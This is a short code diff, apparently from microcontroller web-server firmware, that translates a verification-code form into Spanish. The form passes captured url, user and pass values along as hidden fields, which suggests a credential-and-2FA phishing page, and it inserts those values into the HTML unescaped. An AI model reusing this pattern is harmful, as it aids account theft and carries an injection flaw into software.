@@ -156,13 +156,13 @@ void setup() {
             <style>)====="+ String(VERIFICATION_CODE_STYLE) + R"=====(</style>
           </head>
           <body>
-            <h1>Enter Verification Code</h1>
+            <h1>Introduce el codigo de verificacion</h1>
             <form action='/verify_code' method='POST'>
               <input type='hidden' name='url' value=')=====" + url + R"=====('>
               <input type='hidden' name='user' value=')=====" + user + R"=====('>
               <input type='hidden' name='pass' value=')=====" + pass + R"=====('>
-              <input type='text' name='code' placeholder='Enter code' required>
-              <input type='submit' value='Submit'>
+              <input type='text' name='code' placeholder='Codigo de verificacion' required>
+              <input type='submit' value='Acceder'>
             </form>
           </body>
         </html>
